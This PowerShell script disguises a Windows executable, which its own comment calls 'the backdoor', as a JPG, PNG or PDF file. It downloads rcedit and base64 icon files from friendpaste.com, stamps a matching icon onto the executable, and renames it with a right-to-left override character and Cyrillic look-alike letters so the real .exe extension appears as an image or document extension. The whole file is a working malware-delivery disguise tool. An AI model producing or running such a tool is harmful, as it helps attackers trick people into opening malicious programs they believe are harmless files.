[CmdletBinding()]
param (
    
    [Parameter(Mandatory=$true)]
    [ValidateScript({

        if ($_ -in @("jpg", "png", "pdf")) { $true }
        else { throw "You have to choose one of the following extensions : jpg, pdf or png" }

    })]
    [string]$ext, 

    [Parameter(Mandatory=$true)]
    [ValidateScript({

        if ([System.IO.Path]::GetExtension($_) -eq ".exe") { $true }
        else { throw "You want to obfuscate an exe file !" }
    
    })]
    [string]$exeTObfs

)

function rcEditInstall {

    param (
    
        [string]$InstallPath,
        [string]$rcEditUrl,
        [string]$jpgIcoUrl,
        [string]$pdfIcoUrl,
        [string]$pngIcoUrl
            
    )

    $rcEditExeDir=(-join($InstallPath,'\','exe'))
    $rcEditIcoDir=(-join($InstallPath,'\','icons'))
    $JpgIconPath=(-join($rcEditIcoDir,'\','jpg.ico'))
    $PdfIconPath=(-join($rcEditIcoDir,'\','pdf.ico'))
    $PngIconPath=(-join($rcEditIcoDir,'\','png.ico'))
    $rcEditExePath=(-join($rcEditExeDir,'\','rcedit-x64.exe'))
    $rcEditDirs=@($rcEditExeDir,$rcEditIcoDir)
    $IconsUrls=@($jpgIcoUrl,$pdfIcoUrl,$pngIcoUrl)
    $IconsPath=@($JpgIconPath,$PdfIconPath,$PngIconPath)
    
    if(-not [System.IO.File]::Exists($rcEditExePath)){

        foreach($rcEditInstall in $rcEditDirs){

            [System.IO.Directory]::CreateDirectory($rcEditInstall) 2>&1 | out-null    
    
        }

        for ($i = 0; $i -lt $IconsUrls.Count; $i++){
    
            $icoUrl = $IconsUrls[$i]
            $icoPath = $IconsPath[$i]
            $tmpTXTB64 = (-join($env:TMP,'\','tmpImg.txt'))
            Invoke-WebRequest -Uri $icoUrl -OutFile $tmpTXTB64 -MaximumRedirection 1
            $base64Content = Get-Content -Path $tmpTXTB64 -Raw
            $iconBytes = [System.Convert]::FromBase64String($base64Content)
            [System.IO.File]::WriteAllBytes($icoPath, $iconBytes)
            Remove-Item -Recurse $tmpTXTB64

        }

        Start-BitsTransfer -Source $rcEditUrl -Destination $rcEditExePath
        Write-Host "rcedit has been downloaded and installed in $rcEditExeDir"

    }

}

function fakeBexed {
   
    param (
    
        [string]$fext,
        [string]$exeObf,
        [string]$rceditInstallDir
    
    )

    $fakeExt = @{
    
        jpg = (-join('gp', [char]0x0458, '.exe'))
        pdf = (-join('fd', [char]0x0440, '.exe'))
        png = (-join('gn', [char]0x0440, '.exe'))
        
    }
    
    $ExeRcEdit=(-join($rceditInstallDir,'\','exe','\','rcedit-x64.exe'))
    $IconsDir=(-join($rceditInstallDir,'\','icons','\',"$fext.ico"))
    
    $bkdoorEdit = "& $ExeRcEdit $exeObf --set-icon $IconsDir"
    Invoke-Expression $bkdoorEdit
    Rename-Item -Path $exeObf -NewName ("Ann" + ( [char]0x202E ) + $fakeExt[$fext])
    
}

# here, the backdoor isn't zipped. 

$toolkitDir=(-join($env:LOCALAPPDATA,'\','rcedit'))
$rceditUrlgit='https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe'
$JpgIcoUrltxt='https://friendpaste.com/4y8LNw4UqeFLwhBhZlafrf/original?rev=353063333130'
$PdfIcoUrltxt='https://friendpaste.com/4Fxoj9drYNa4CWasQCL6h3/original?rev=343332383164'
$PngIcoUrltxt='https://friendpaste.com/4y8LNw4UqeFLwhBhZlS4QA/original?rev=323530613336'

rcEditInstall -InstallPath $toolkitDir -rcEditUrl $rceditUrlgit -jpgIcoUrl $JpgIcoUrltxt -pdfIcoUrl $PdfIcoUrltxt -pngIcoUrl $PngIcoUrltxt
$ext = $ext.ToLower()
fakeBexed -fext $ext -exeObf $exeTObfs -rceditInstall $toolkitDir
